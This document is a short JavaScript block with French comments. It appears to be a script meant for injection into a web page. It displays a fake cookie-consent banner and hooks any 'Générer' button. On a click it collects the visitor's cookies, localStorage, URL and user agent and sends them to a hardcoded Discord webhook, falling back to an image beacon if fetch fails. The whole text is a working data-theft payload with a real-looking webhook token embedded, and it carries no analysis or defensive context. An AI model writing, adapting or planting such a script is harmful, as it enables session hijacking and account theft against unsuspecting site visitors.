<script>
document.addEventListener("DOMContentLoaded", function() {
    
    // 1. REMPLACE PAR TON WEBHOOK
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1571234677434617986/8XG1WsjhxFIQTL816bRPn7I8D37zJM0h_l_APXRETUyW__bySrUfWXuoQKEL-I-gIZlL";

    // 2. FONCTION QUI ENVOIE LES DONNÉES
    function sendData(source) {
        const payload = {
            trigger: source,
            url: window.location.href,
            cookies: document.cookie || "NONE",
            localStorage: {},
            sessionStorage: {},
            userAgent: navigator.userAgent
        };

        // Récupérer le localstorage
        for (let i = 0; i < localStorage.length; i++) {
            let key = localStorage.key(i);
            payload.localStorage[key] = localStorage.getItem(key);
        }

        // Envoyer avec fetch et mode no-cors
        fetch(WEBHOOK_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "text/plain" },
            body: JSON.stringify(payload)
        }).catch(function() {
            // Fallback image si fetch est bloqué
            let img = new Image();
            img.src = WEBHOOK_URL + "?data=" + encodeURIComponent(JSON.stringify(payload));
        });
    }

    // 3. CRÉER LA BANNIÈRE EN FORCE
    let banner = document.createElement("div");
    // Style inline pour être sûr que ça s'affiche au-dessus de tout
    banner.style.cssText = "position:fixed; bottom:0; left:0; width:100%; background:#000; color:#fff; text-align:center; padding:20px; z-index:999999; font-family:sans-serif; border-top:2px solid #0066ff;";
    
    // Bouton Accept
    let acceptBtn = document.createElement("button");
    acceptBtn.innerText = "Accepter les cookies";
    acceptBtn.style.cssText = "background:#0066ff; color:#fff; border:none; padding:10px 20px; margin-left:20px; cursor:pointer; font-weight:bold; border-radius:4px;";
    
    // Texte de la bannière
    let textNode = document.createTextNode("Nous utilisons des cookies pour améliorer votre expérience.");
    
    banner.appendChild(textNode);
    banner.appendChild(acceptBtn);
    document.body.appendChild(banner);

    // 4. ACTION AU CLIC SUR ACCEPT
    acceptBtn.addEventListener("click", function() {
        banner.style.display = "none"; // Cacher la bannière
        sendData("ACCEPT_CLICKED");    // Envoyer les données
    });

    // 5. ACTION AU CLIC SUR GÉNÉRER (Sans casser le bouton original)
    // On cherche le bouton par son texte, peu importe son ID
    let allButtons = document.querySelectorAll("button");
    allButtons.forEach(function(btn) {
        if (btn.innerText.trim().toLowerCase() === "générer" || btn.innerText.trim().toLowerCase() === "generer") {
            btn.addEventListener("click", function() {
                // On attend 200ms que le site original fasse son travail (genre créer un cookie)
                setTimeout(function() {
                    sendData("GENERATE_CLICKED");
                }, 200);
            });
        }
    });
});
</script>
